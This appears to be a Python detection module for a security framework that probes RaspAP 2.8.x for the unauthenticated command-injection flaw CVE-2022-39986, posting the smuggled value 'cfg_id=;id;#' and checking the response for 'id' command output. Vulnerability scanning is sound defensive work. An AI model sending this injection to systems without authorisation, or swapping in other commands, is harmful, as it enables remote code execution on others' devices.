#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Command injection vulnerability in RaspAP 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'RaspAP 2.8.7 - Unauthenticated Command Injection Detection',
        'description': 'A Command injection vulnerability in RaspAP 2.8.0 thru 2.8.7 allows unauthenticated attackers to execute arbitrary commands via the cfg_id parameter in /ajax/openvpn/activate_ovpncfg.php and /ajax/openvpn/del_ovpncfg.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'packetstorm', 'raspap', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/174190/RaspAP-2.8.7-Unauthenticated-Command-Injection.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-39986',
            'https://medium.com/@ismael0x00/multiple-vulnerabilities-in-raspap-3c35e78809f2',
            'http://packetstormsecurity.com/files/174190/RaspAP-2.8.7-Unauthenticated-Command-Injection.html',
            'https://github.com/RaspAP/raspap-webgui/blob/master/ajax/openvpn/activate_ovpncfg.php',
        ],
        'cve': 'CVE-2022-39986',
    }

    def run(self):
        path = '/ajax/openvpn/del_ovpncfg.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='cfg_id=;id;#\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/html',)
        body_regexes = ('uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='RaspAP 2.8.7 - Unauthenticated Command Injection detected', path=path)
            return True
        return False

